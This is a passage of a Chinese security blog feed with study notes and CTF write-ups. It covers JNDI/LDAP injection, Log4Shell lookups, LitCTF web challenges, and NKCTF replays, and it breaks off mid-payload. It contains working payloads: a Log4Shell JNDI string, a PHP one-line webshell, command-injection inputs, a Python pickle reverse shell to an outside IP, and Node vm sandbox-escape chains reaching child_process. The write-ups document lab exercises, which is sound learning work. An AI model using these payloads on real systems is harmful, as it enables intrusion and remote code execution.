<p>前面我写的Ldap高版本的注入的exp是自己搭建的Ldap服务器,但这样太过于麻烦,于是我尝试再网上找项目,于是我便找到了如下项目。<br><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/tree/master">JNDI-Exploit-Bypass-Demo</a><br>使用这个项目需要我们自己进行打包<br>食用方法<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn package</span><br><span class="line">java -cp HackerRMIRefServer-all.jar HackerRMIRefServer 0.0.0.0 8088 1099</span><br><span class="line">java -cp HackerRMIRefServer-all.jar HackerLDAPRefServer  0.0.0.0 8088 1389</span><br></pre></td></tr></table></figure><br>这个项目内有个Ldap反序列化触发的java文件我们打打包前要对其进行修改<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/36.png" class="" title="alt text"><br>将其反序列化的payload进行更改，我这里改成了CC1的链</p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/37.png" class="" title="alt text">
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/38.png" class="" title="alt text">
<p>可以看到服务器也显示了请求记录<br>我们调试一下客户端。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/39.png" class="" title="alt text"><br>前半部分都相同，而后面其检测了传入值attrs的<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>属性。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/41.png" class="" title="alt text"><br>而这个<code>JAVA_ATTRIBUTES[SERIALIZED_DATA]</code>得到的就是字符串javaSerializedData<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/39.png" class="" title="alt text"><br>而后会进入deserialzeObject方法<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/40.png" class="" title="alt text"><br>这就是标准的反序列化了。<br>这样就触发反序列化漏洞。</p>
<h1 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h1><h2 id="JNDI的成因"><a href="#JNDI的成因" class="headerlink" title="JNDI的成因"></a>JNDI的成因</h2><p>在log4j2的2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）版本内存在着JNDI注入的CVE-2021-44228</p>
<p>改漏洞的利用方式很简单。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://111.xxx.xxx.159:389/EvilObj&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;hello &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>起一个JNDI服务器然后运行上面的脚本就会发现成功命令执行<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/44.png" class="" title="alt text"><br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/43.png" class="" title="alt text"></p>
<p>log4j2的漏洞主要出现在 org.apache.logging.log4j.core.lookup.StrSubstitutor类上。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/47.png" class="" title="alt text"><br>这个类会先堆<code>$&#123;</code>进行匹配<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/46.png" class="" title="alt text"><br>然后再匹配尾部<code>&#125;</code><br>以此来提取内部的值<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/52.png" class="" title="alt text"></p>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/54.png" class="" title="alt text">
<p>然后会进入resolveVariable来触发Interpolator的lookup<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/51.png" class="" title="alt text"><br>lookup方法会匹配: 即提取出前面的JNDI。<br>通过strLookupMap来提取出:前关键词的类。赋值给lookup，然后通过lookup.lookup来调用起地下的lookup<br>我们寻找这个strLookupMap可以发现如下。<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/55.png" class="" title="alt text"><br>JNDI关键词指向的类就是org.apache.logging.log4j.core.lookup.JndiLookup<br>所以lookup.lookup会指向JndiLookup.lookup<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/53.png" class="" title="alt text"><br>JndiLookup.lookup下会通过jndiManager.lookup来进行JNDI的加载。<br>所以这个log4j可以通过${jndi:ldap://xxxx}<br>就可以进行jndi注入</p>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/56.png" class="" title="alt text">
<p>在这里我们可以看到map还有指向其他的类。如sys<br>我们打开其指向的类<br><img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/57.png" class="" title="alt text"><br>我们可以看看到其直接返回了System.getProperty这样我们就可以进行信息探测。如输入的key为java.class.path就可以得到其加载的所有依赖的版本。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;sys:java.class.path&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;hello &#123;&#125;&quot;</span>,username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">----------------------------------</span><br><span class="line"><span class="number">10</span>:<span class="number">39</span>:<span class="number">41.693</span> [main] ERROR log4j.Log4j - hello C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\charsets.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\access-bridge-<span class="number">64.</span>jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\cldrdata.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\dnsns.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\jaccess.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\localedata.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\nashorn.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunec.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunjce_provider.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunmscapi.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\sunpkcs11.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\ext\zipfs.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\jce.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\jfr.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\jsse.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\management-agent.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\resources.jar;C:\Program Files\BellSoft\LibericaJDK-<span class="number">8</span>\jre\lib\rt.jar;C:\Users\<span class="number">24882</span>\Desktop\java-sec\cc\target\classes;C:\Users\<span class="number">24882</span>\.m2\repository\org\apache\logging\log4j\log4j-core\<span class="number">2.14</span><span class="number">.1</span>\log4j-core-<span class="number">2.14</span><span class="number">.1</span>.jar;C:\Users\<span class="number">24882</span>\.m2\repository\org\apache\logging\log4j\log4j-api\<span class="number">2.14</span><span class="number">.1</span>\log4j-api-<span class="number">2.14</span><span class="number">.1</span>.jar;C:\Users\<span class="number">24882</span>\.m2\repository\commons-collections\commons-collections\<span class="number">3.2</span><span class="number">.1</span>\commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar;C:\Users\<span class="number">24882</span>\.m2\repository\org\apache\commons\commons-collections4\<span class="number">4.0</span>\commons-collections4-<span class="number">4.0</span>.jar;C:\Program Files\JetBrains\IntelliJ IDEA <span class="number">2024.1</span><span class="number">.1</span>\lib\idea_rt.jar</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/10/11/JNDI%E6%B3%A8%E5%85%A5/58.png" class="" title="alt text">
<p>env也可以进行环境变量的读取登</p>
<p>而这个log4j的漏洞在2.15之后就已经修复了，2.15版本将lookup给禁了，经过在本地尝试像sys，env这种获取敏感信息的方式也无法使用了</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>JNDI</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF:LitCTF入门web的wp</title>
    <url>/2023/11/08/NSSCTF-LitCTF%E5%85%A5%E9%97%A8web%E7%9A%84wp/</url>
    <content><![CDATA[<h1 id="这也是一个入门题的wp"><a href="#这也是一个入门题的wp" class="headerlink" title="这也是一个入门题的wp"></a>这也是一个入门题的wp</h1><h2 id="第一题就不说了直接第二题PHP是世界上最好的语言！！"><a href="#第一题就不说了直接第二题PHP是世界上最好的语言！！" class="headerlink" title="第一题就不说了直接第二题PHP是世界上最好的语言！！"></a>第一题就不说了直接第二题PHP是世界上最好的语言！！</h2><p>这题从题目看好像是考代码审计，所有先F12打开源码看看，但是我们发现源码好长，所有应该不是考的代码审计，我们看页面可以发现这个网页是应该解码网页，我们可以尝试在输入窗口直接输入一些php危险函数代码，如<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&quot;ls /&quot;);</span><br></pre></td></tr></table></figure><br>我们可以发现回显了文件名证明了没有过滤，而且在文件名里我们发现了flag我们直接使用<code>cat</code>来实现对flag的查看代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><br>屏幕回显出flag。</p>
<h2 id="第三题-导弹迷踪"><a href="#第三题-导弹迷踪" class="headerlink" title="第三题.导弹迷踪"></a>第三题.导弹迷踪</h2><p>这道题我们打开发现是一款游戏，你可以直接通过然后屏幕就会返回flag但是正常人都不会去打这款游戏的，我们观察屏幕可以发现左上角有个qualifying level资格级别，我们可以猜测关卡数应该是由‘qualifying level’或者level来命名，我们在源码中搜索后发现关卡数的变量是level，找到一个语句level==6后会发现如果通关后输出的flag就在后面</p>
<h2 id="第四题Follow-me-and-hack-me"><a href="#第四题Follow-me-and-hack-me" class="headerlink" title="第四题Follow me and hack me"></a>第四题Follow me and hack me</h2><p>这道题目就是一个简单的传参题目用hackbar，首先用git传一个CTF为Lit2023后用post传一个Challenge为i’m_c0m1ng，首先我们打开hackbar在url上打下<code>?CTF=Lit2023</code><br>在用post打下<code>Challenge=i&#39;m_c0m1ng</code><br>得到flag</p>
<h2 id="第五题Ping"><a href="#第五题Ping" class="headerlink" title="第五题Ping"></a>第五题Ping</h2><p>这是一道关于ping的题目我们尝试一下直接输入指令发现弹出只能填写ip，我们查看一下源码发现由于中间的一串js代码的影响如下<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">check_ip</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> ip = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;command&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">let</span> re = <span class="regexp">/^(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d&#123;2&#125;|[1-9]?\d)$/</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(re.<span class="title function_">test</span>(ip.<span class="title function_">trim</span>()))&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><br>导致我们只能输入ip所以我们可以暴力一点直接在控制台里禁用js然后在输入指令<code>|ls /</code>看见有flag文件，直接输入<code>cat /flag</code>查看flag</p>
<h2 id="第六题-1zjs"><a href="#第六题-1zjs" class="headerlink" title="第六题 1zjs"></a>第六题 1zjs</h2><p>打开又是游戏我们直接搜索flag没有什么信息在搜索php发现一个php文件的名字在url上搜索这个php文件屏幕回显出大片括号和感叹号在百度上一查是JSFuck，解码后得到flag</p>
<h2 id="第七题-作业管理系统"><a href="#第七题-作业管理系统" class="headerlink" title="第七题 作业管理系统"></a>第七题 作业管理系统</h2><p>这道题目可以上传文件所有我们可以上传一个，一句话木马文件，只要在php文件下写下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>上传成功后在url上访问上传的php文件之后在页面进行post的传值对系统进行指令操作查看flag，用post对1进行传值代码如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&quot;ls /&quot;)</span><br></pre></td></tr></table></figure><br>查看目录后用cat语句对flag进行查看</p>
<h2 id="第八题-Http-pro-max-plus"><a href="#第八题-Http-pro-max-plus" class="headerlink" title="第八题 Http pro max plus"></a>第八题 Http pro max plus</h2><p>题目显示只允许本地运行，我们直接打开<code>hackbar</code>用<code>xff</code>进行修改<code>ip</code>为<code>127.0.0.1</code>。结果被嘲讽只会<code>xff</code>了，我们可以换一中<code>client-ip</code>来对ip修改。随后回显你不是来自pornhub.com。我们直接用<code>Referer</code>来修改请求网站，后回显要用<code>chrome</code>我们直接修改<code>user-agent</code>为<code>chrome</code>随后回显告诉我们要代理，代理为clash.win随后屏幕回显，在url打开php文件，后打开查看源码会发现另一个php打开就是flag</p>
<h2 id="vim-yyds"><a href="#vim-yyds" class="headerlink" title="vim yyds"></a>vim yyds</h2><p>提示是漏了我们可以猜测是vim强退后造成了缓存备份，我们直接在url上打开index.php.swp得到一个备份文件打开文件后查看源码，发现需要post输入一个和password经过base64编码后一样的值就可以得到flag，password的定义为Give_Me_Your_Flag</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>入门题wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF的复现学习</title>
    <url>/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="这次NKCTF我可以算是打的非常差了。下面是我的一下反思和复现学习"><a href="#这次NKCTF我可以算是打的非常差了。下面是我的一下反思和复现学习" class="headerlink" title="这次NKCTF我可以算是打的非常差了。下面是我的一下反思和复现学习"></a>这次NKCTF我可以算是打的非常差了。下面是我的一下反思和复现学习</h1><h1 id="我的第一个CMS"><a href="#我的第一个CMS" class="headerlink" title="我的第一个CMS"></a>我的第一个CMS</h1><p>这题没什么好说的了。CVE什么都找到了，扫了两个字典弱密码没扫出来。悲啊。密码本已经换了气死了。字典里只有admin123没有Admin123。我看了一下网上的字典很多都没有Admin123。<br><a href="https://github.com/capture0x/CMSMadeSimple/">CVE-2024-27622</a><br>直接admin登陆，之后按照cve进行代码执行就可以了</p>
<h1 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h1><p>这题我们打开会发现为pgadmin4的8.3版本我们在网上可以查到其存在上传文件进行反序列化执行的漏洞。<a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">CVE-2024-2044 漏洞</a><br>我们要先登陆后台。账号提示为tacooooo@qq.com密码我在打比赛的时候猜了出来为tacooooo。<br>之后我们在进行文件上传<br><img src="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/1.png" class="" title="alt text"><br>上传文件的时候我们可以进行抓包<br>发包后查看响应来查看文件上传的目录位置<br>因为触发这个反序列化需要将session的的一部分改成文件路径如下<br>/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle<br>之后再触发反序列化<br><img src="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/2.png" class="" title="alt text"><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">class exp():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec, (&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;101.32.62.24&#x27;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&quot;,))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    c = exp()</span><br><span class="line">    payload = pickle.dumps(c)</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>这一题我在复现的时候一直不知道这么回事官方的exp一直弹不出shell。还是利用了这个队伍的exp进行尝试。<a href="https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g">https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g</a><br>很奇怪，这个师傅的exp就能弹shell。文章的就弹不出去。<br>文章在打比赛的时候这个文章有找到，也进行了尝试失败后就放弃了。把时间都浪费在了js rce上导致我没有认真看这道题目。只能说能力不够。文章都看不太懂。</p>
<h1 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h1><p>这道题目主要考察js vm沙箱绕过，我看了一下官方wp，官方wp的做法是原型链污染。而我看其他师傅的文章主要的方法为绕waf。<br>对于绕waf我再打比赛时有找到如下两篇文章。绕到最后只能说很接近答案了。还是实力不足。对js的了解不够。<br><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLp0WF5i%3De%2B4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-4">NodeJS VM和VM2沙箱逃逸</a><br><a href="https://www.anquanke.com/post/id/237032#h3-11">nodejs中代码执行绕过的一些技巧</a><br>我们打开题目扫一下目录可以扫到/secret<br>我们打开可以发现源码<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;/public&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span>;</span><br><span class="line">    <span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">            <span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><br>我们首先看到我们需要绕过一个空的vm。网上可以查到可以使用arguments.callee.caller和Proxy来劫持属性。我们直接使用网上的payload<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(() =&gt;&#123;</span><br><span class="line">    const a = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return a</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><br>但是这题还要绕waf。要绕过process和execSync。process可以有很多种绕过方法。我这里就直接使用模板字符串进行绕过了，<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`$&#123;`$&#123;`return proc`&#125;ess`&#125;`和`$&#123;`$&#123;`child_pr`&#125;ocess`&#125;`。</span><br></pre></td></tr></table></figure><br>前一个的waf还是比较好绕的。但是后一个waf再比赛的时候就卡住了我。我在比赛时有想到使用反射类来尝试拿到exec。但是由于没有理解绕沙箱的原理导致在使用反射类的时候，直接报错未定义。在赛后我花了一段会时间将沙箱的绕过原理重新看了一遍。<br>发现沙箱绕过的主要原理是从global来得到其他对象并赋值到变量里。分析了一下payload才发现是之前没有理解透导致waf绕不过去。<br>首先我们可以尝试射调用函数来得到exec。首先Reflect是一个内置方法，即我们可以直接在沙箱里进行使用。网上得到exec的payload如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;eva&#x27;)))</span><br></pre></td></tr></table></figure><br>但由于我们这是在沙箱环境无法得到global。所以我们需要更改一下。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">        <span class="keyword">const</span> b=(cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span></span>))();</span><br><span class="line">        <span class="keyword">const</span> c=b.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(c, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(c).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&#x27;calc&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><br>我们通过arguments.callee.caller来得到一个对象。再通过cc.constructor.constructor来获取到global。这样我们就可以得到process。通过process我们就可以得到child_process。最后通过反射类调用得到exce。进行命令执行。<br><img src="/2024/03/25/NKCTF%E7%9A%84%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/3.png" class="" title="alt text"><br>我们可以看到很完美的弹了计算机。</p>
<p>其实我在比赛时还有想要尝试使用fs看一下能不能对文件进行操作，结果本地忘记导入fs模块导致这么也无法在本地实现。这还是在赛后才看到的。悲<br>我还在第一名的队伍里看到了这样的绕waf姿势<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span 